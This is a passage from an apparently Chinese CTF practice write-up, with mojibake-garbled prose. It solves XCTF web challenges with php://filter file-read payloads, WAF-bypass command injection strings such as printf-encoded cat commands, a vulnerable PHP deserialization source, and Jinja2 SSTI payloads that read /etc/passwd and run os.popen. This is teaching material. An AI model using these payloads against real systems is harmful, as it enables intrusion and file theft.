<p>array_searchÂáΩÊï∞ÊòØÂº±ÊØîËæÉÔºåÊâÄ‰ª•Áî®0‰ª£ÊõøDGGJ</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?a=1e9&amp;b=53724&amp;c={&#34;m&#34;:&#34;2023c&#34;,&#34;n&#34;:[[],0]}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="file_includeweb">file_include(web)
</h2><p>Êñá‰ª∂ÂåÖÂê´</p>
<p>Â∞ùËØïÁî®ËΩ¨base64ÁºñÁ†ÅÊñπÊ≥ïÊü•Áúãcheck.php</p>
<p>‰ΩÜÊòØËØï‰∫Ü‰∏Ä‰∏ãÂèëÁé∞ÈÉΩË¢´ËøáÊª§‰∫Ü</p>
<h3 id="php‰º™ÂçèËÆÆËØªÊñá‰ª∂ÁöÑÂÖ∂‰ªñÊñπÂºè">php://‰º™ÂçèËÆÆËØªÊñá‰ª∂ÁöÑÂÖ∂‰ªñÊñπÂºè
</h3><p>convert.<em>ËøáÊª§Âô®ÊîØÊåÅconvert.iconv.</em> Ê†ºÂºèÔºå‰ΩøÁî®ÊñπÊ≥ïÔºö</p>
<p><code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</code>
Êàñ
<code>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt; </code></p>
<p>‰æãÂ¶ÇÔºö</p>
<p><code>convert.iconv.UCS-4*.UCS-4BE </code>  &mdash;&gt;  Â∞ÜÊåáÂÆöÁöÑÊñá‰ª∂‰ªéUCS-4*ËΩ¨Êç¢‰∏∫UCS-4BE ËæìÂá∫</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">phpÊîØÊåÅÁöÑÁºñÁ†ÅÊ†ºÂºè(ÈÉ®ÂàÜ)
</span></span><span class="line"><span class="cl">UCS-4*
</span></span><span class="line"><span class="cl">UCS-4BE
</span></span><span class="line"><span class="cl">UCS-4LE*
</span></span><span class="line"><span class="cl">UCS-2
</span></span><span class="line"><span class="cl">UCS-2BE
</span></span><span class="line"><span class="cl">UCS-2LE
</span></span><span class="line"><span class="cl">UTF-32*
</span></span><span class="line"><span class="cl">UTF-32BE*
</span></span><span class="line"><span class="cl">UTF-32LE*
</span></span><span class="line"><span class="cl">UTF-16*
</span></span><span class="line"><span class="cl">UTF-16BE*
</span></span><span class="line"><span class="cl">UTF-16LE*
</span></span><span class="line"><span class="cl">UTF-7
</span></span><span class="line"><span class="cl">UTF7-IMAP
</span></span><span class="line"><span class="cl">UTF-8*
</span></span><span class="line"><span class="cl">ASCII*
</span></span><span class="line"><span class="cl">EUC-JP*
</span></span><span class="line"><span class="cl">SJIS*
</span></span><span class="line"><span class="cl">eucJP-win*
</span></span><span class="line"><span class="cl">SJIS-win*
</span></span><span class="line"><span class="cl">ISO-2022-JP
</span></span><span class="line"><span class="cl">ISO-2022-JP-MS
</span></span><span class="line"><span class="cl">CP932
</span></span><span class="line"><span class="cl">CP51932
</span></span><span class="line"><span class="cl">SJIS-macÔºàÂà´ÂêçÔºöMacJapaneseÔºâ
</span></span><span class="line"><span class="cl">SJIS-Mobile#DOCOMOÔºàÂà´ÂêçÔºöSJIS-DOCOMOÔºâ
</span></span><span class="line"><span class="cl">SJIS-Mobile#KDDIÔºàÂà´ÂêçÔºöSJIS-KDDIÔºâ
</span></span><span class="line"><span class="cl">SJIS-Mobile#SOFTBANKÔºàÂà´ÂêçÔºöSJIS-SOFTBANKÔºâ
</span></span><span class="line"><span class="cl">UTF-8-Mobile#DOCOMOÔºàÂà´ÂêçÔºöUTF-8-DOCOMOÔºâ
</span></span><span class="line"><span class="cl">UTF-8-Mobile#KDDI-A
</span></span><span class="line"><span class="cl">UTF-8-Mobile#KDDI-BÔºàÂà´ÂêçÔºöUTF-8-KDDIÔºâ
</span></span><span class="line"><span class="cl">UTF-8-Mobile#SOFTBANKÔºàÂà´ÂêçÔºöUTF-8-SOFTBANKÔºâ
</span></span><span class="line"><span class="cl">ISO-2022-JP-MOBILE#KDDIÔºàÂà´ÂêçÔºöISO-2022-JP-KDDIÔºâ
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=php://filter/convert.iconv.UTF-8*.UCS-4LE*/resource=flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="unsepingweb">unseping(web)
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ease</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$method</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$args</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span> <span class="o">=</span> <span class="nv">$method</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span> <span class="o">=</span> <span class="nv">$args</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;ping&#34;</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">call_user_func_array</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">ping</span><span class="p">(</span><span class="nv">$ip</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">exec</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match_all</span><span class="p">(</span><span class="s2">&#34;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&#34;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">,</span> <span class="nv">$pat_array</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;don&#39;t hack&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">waf</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>   
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nv">$ctf</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèçÂ∫èÂàóÂåñÊºèÊ¥û</p>
<p>destructÂáΩÊï∞‰ºöÂú®ÂèçÂ∫èÂàóÂåñÂáΩÊï∞Ë∞ÉÁî®Êó∂Ë¢´Ë∞ÉÁî®ÔºåË¶ÅÊ±ÇÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞Âê´pingÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞Áî±‰∫écall_user_func_arrayÂáΩÊï∞ÊâÄ‰ª•Ë¶Å‰∏∫Êï∞ÁªÑarray()</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250112110342482.png"
	width="1231"
	height="549"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250112110342482_hu2965253404311271321.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250112110342482_hu2987231565219904431.png 1024w"
	loading="lazy"
	
		alt="image-20250112110342482"
	
	
		class="gallery-image" 
		data-flex-grow="224"
		data-flex-basis="538px"
	
></p>
<p>Áé∞Âú®ËÄÉËôëÂú®array‰∏≠Â°´ÂëΩ‰ª§ËÆ©‰ªñÊâßË°å</p>
<p>Ê≥®ÊÑèÊûÑÈÄ†Êó∂ÂºïÂè∑ÁöÑÁªÜËäÇÔºåÂçïÂºïÂè∑‰ºöÊää‰∏≠Èó¥ÁöÑÂÜÖÂÆπÂÆåÂÖ®ËßÜ‰∏∫Â≠óÁ¨¶‰∏≤Ôºå‰ΩÜÂèåÂºïÂè∑‰ºöÊääÂÜÖÈÉ®ÂèòÈáèËøõË°åËß£ÊûêÔºåËã•Âú®ËæìÂÖ•arrayÁöÑÂèÇÊï∞Êó∂Áî®ÂèåÂºïÂè∑Ôºå‰ºöÂØπ${}‰∏≠ÁöÑÂÜÖÂÆπËøõË°åËß£ÊûêÂØºËá¥payloadÊûÑÈÄ†Â§±Ë¥•„ÄÇ</p>
<p>lsË¢´ËøáÊª§Êàë‰ª¨Áî®l&quot;&ldquo;sÁªïËøá,ÊàñËÄÖÂèçÊñúÁ∫øÁªïËøál\s</p>
<p>ÁõÆÂΩï‰∏ãÊúâflag_1s_hereÊñá‰ª∂Â§πÔºåflagÂèØ‰ª•Áî®f&quot;&ldquo;lagÁªïËøá‰πüÂèØ‰ª•f***</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">l&#34;&#34;s${IFS}f&#34;&#34;lag_1s_here
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁõÆÂΩï‰∏ãÊúâflag_831b69012c67b35f.phpÊñá‰ª∂</p>
<p>catÂêåÊ†∑ÂèØ‰ª•Áî®c&quot;&ldquo;atÁªïËøá,phpÁî®p&quot;&ldquo;hpÁªïËøá,ÊàñËÄÖÊï¥‰∏™Áî®f*‰ª£ÊõøÔºå/Ë¶ÅÁî®Ë¶ÅÁî®printfÂèä$()ÁªïËøá</p>
<p>/-&gt;$(printf${IFS}&quot;\57&rdquo;)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c&#34;&#34;at${IFS}f&#34;&#34;lag_1s_here$(printf${IFS}&#34;\57&#34;)f&#34;&#34;lag_831b69012c67b35f.p&#34;&#34;hp
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖÁõ¥Êé•Êï¥‰∏™Áî®printÂíå$()ÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$(printf${IFS}&#34;\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160(cat flag_1s_here/flag_831b69012c67b35f.phpÁöÑÂÖ´ËøõÂà∂ÊàñÂçÅÂÖ≠ËøõÂà∂ÁºñÁ†ÅÈÉΩÂèØ‰ª•)&#34;)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="web_python_template_injectionweb">Web_python_template_injection(web)
</h2><h3 id="ssti">SSTI
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__class__  ËøîÂõûÁ±ªÂûãÊâÄÂ±ûÁöÑÂØπË±°
</span></span><span class="line"><span class="cl">__mro__    ËøîÂõû‰∏Ä‰∏™ÂåÖÂê´ÂØπË±°ÊâÄÁªßÊâøÁöÑÂü∫Á±ªÂÖÉÁªÑÔºåÊñπÊ≥ïÂú®Ëß£ÊûêÊó∂ÊåâÁÖßÂÖÉÁªÑÁöÑÈ°∫Â∫èËß£Êûê„ÄÇ
</span></span><span class="line"><span class="cl">__base__   ËøîÂõûËØ•ÂØπË±°ÊâÄÁªßÊâøÁöÑÂü∫Á±ª  // __base__Âíå__mro__ÈÉΩÊòØÁî®Êù•ÂØªÊâæÂü∫Á±ªÁöÑ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">__subclasses__   ÊØè‰∏™Êñ∞Á±ªÈÉΩ‰øùÁïô‰∫ÜÂ≠êÁ±ªÁöÑÂºïÁî®ÔºåËøô‰∏™ÊñπÊ≥ïËøîÂõû‰∏Ä‰∏™Á±ª‰∏≠‰ªçÁÑ∂ÂèØÁî®ÁöÑÁöÑÂºïÁî®ÁöÑÂàóË°®
</span></span><span class="line"><span class="cl">__init__  Á±ªÁöÑÂàùÂßãÂåñÊñπÊ≥ï
</span></span><span class="line"><span class="cl">__globals__  ÂØπÂåÖÂê´ÂáΩÊï∞ÂÖ®Â±ÄÂèòÈáèÁöÑÂ≠óÂÖ∏ÁöÑÂºïÁî®
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∏∏ËßÅpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËÑöÊú¨Êü•Êâæos</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">233</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span><span class="o">=</span><span class="s1">&#39;ip/?name={{&#34;&#34;.__class__.__base__.__subclasses__()[&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;]}}&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="s1">&#39;os._wrap_close&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Êü•ÊâæÂç±Èô©ÂáΩÊï∞
</span></span><span class="line"><span class="cl">‰æãÂ¶Çeval
</span></span><span class="line"><span class="cl">ÊãºÊé•ÈîÆÂÄº
</span></span><span class="line"><span class="cl">[&#34;__builtins__&#34;][&#39;eval&#39;]
</span></span><span class="line"><span class="cl">ÊâßË°åÂëΩ‰ª§
</span></span><span class="line"><span class="cl">(&#39;__import__(&#34;os&#34;).popen(&#34;id&#34;).read()&#39;)
</span></span><span class="line"><span class="cl">Âú®popen‰∏≠Êù•ÊâßË°åÂëΩ‰ª§
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈ¢òÂÖà</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[2].__subclasses__()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êúâ‰∏Ä‰∏™typefileÁ±ªÂûã,Áî®‰∫éÊñá‰ª∂ËØªÂèñÔºà‰ΩçÁΩÆÂú®40Ôºâ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{ [].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read() }}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøòÊúâ‰∏Ä‰∏™&lt;class &lsquo;site._printer&rsquo;&gt;Á±ªÂûãÔºà‰ΩçÁΩÆÂú®71ÔºâÔºåÁî®‰∫éÂëΩ‰ª§ÊâßË°å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].listdir(&#39;.&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèëÁé∞f14g</p>
<p>Áî®Êñá‰ª∂ËØªÂèñÂëΩ‰ª§</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;fl4g&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ÂÆòÊñπwp">ÂÆòÊñπWP
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÂÖàÊü•ÁúãÊâÄÊúâÊ®°Âùó
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()}}
</span></span><span class="line"><span class="cl">osÊ®°ÂùóÈÉΩÊòØ‰ªéwarnings.catch_warningsÊ®°ÂùóÂÖ•ÊâãÁöÑÔºåÂú®ÊâÄÊúâÊ®°Âùó‰∏≠Êü•Êâæcatch_warningsÁöÑ‰ΩçÁΩÆÔºà59Ôºâ
</span></span><span class="line"><span class="cl">Êü•Áúãcatch_warningsÊ®°ÂùóÈÉΩÂ≠òÂú®Âì™‰∫õÂÖ®Â±ÄÂáΩÊï∞ÔºåÂèØ‰ª•ÊâæÂà∞linecacheÂáΩÊï∞ÔºåosÊ®°ÂùóÂ∞±Âú®ÂÖ∂‰∏≠
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}}
</span></span><span class="line"><span class="cl">‰ΩøÁî®[&#39;o&#39;+&#39;s&#39;],ÂèØÁªïËøáÂØπosÂ≠óÁ¨¶ÁöÑËøáÊª§
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()&#39;)}}Êü•ÊâæÂà∞flag
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__mro__[2].__subclasses__()[40](&#34;fl4g&#34;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="web_php_unserializeweb">Web_php_unserialize(web)
</h2><p>È¶ñÂÖàÂæóÁªïËøáÊ≠£ÂàôÂåπÈÖç</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250112153945490.png"
	width="416"
	height="36"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250112153945490_hu7905391521995938062.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250112153945490_hu4556472256560916946.png 1024w"
	loading="lazy"
	
		alt="image-20250112153945490"
	
	
		class="gallery-image" 
		data-flex-grow="1155"
		data-flex-basis="2773px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/i Ë°®Á§∫ÂåπÈÖçÁöÑÊó∂ÂÄô‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜô
</span></span><span class="line"><span class="cl">\d ÂåπÈÖç‰∏Ä‰∏™Êï∞Â≠óÂ≠óÁ¨¶„ÄÇÁ≠â‰ª∑‰∫é [0-9]„ÄÇ
</span></span><span class="line"><span class="cl">‚Äú+‚Äù Âá∫Áé∞Ëá≥Â∞ë1Ê¨°
</span></span><span class="line"><span class="cl">[ ] ÊòØÂÆö‰πâÂåπÈÖçÁöÑÂ≠óÁ¨¶ËåÉÂõ¥
</span></span><span class="line"><span class="cl">[oc]ÊòØÂåπÈÖçoÊàñc‰ªªÊÑè‰∏Ä‰∏™
</span></span><span class="line"><span class="cl">[xyz] Â≠óÁ¨¶ÈõÜÂêà„ÄÇÂåπÈÖçÊâÄÂåÖÂê´ÁöÑ‰ªªÊÑè‰∏Ä‰∏™Â≠óÁ¨¶„ÄÇ‰æãÂ¶ÇÔºå ‚Äò[abc]‚Äô ÂèØ‰ª•ÂåπÈÖç ‚Äúplain‚Äù ‰∏≠ÁöÑ ‚Äòa‚Äô„ÄÇ
</span></span><span class="line"><span class="cl">\d+ÊòØ‰∏∫‰∫ÜÂåπÈÖç[0-9]ÁöÑÊï∞Â≠óÔºåÂ§öÊ¨°ÂåπÈÖçÔºÅ
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞±ÊòØÊÉ≥ËøáÊª§o:4,Êàë‰ª¨Áî®o:+4ÁªïËøá</p>
<p>wakeupÊàêÂëòÊï∞Âä†‰∏ÄÂ∞±Ë°å</p>
<p>ËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Demo</span> <span class="p">{</span>
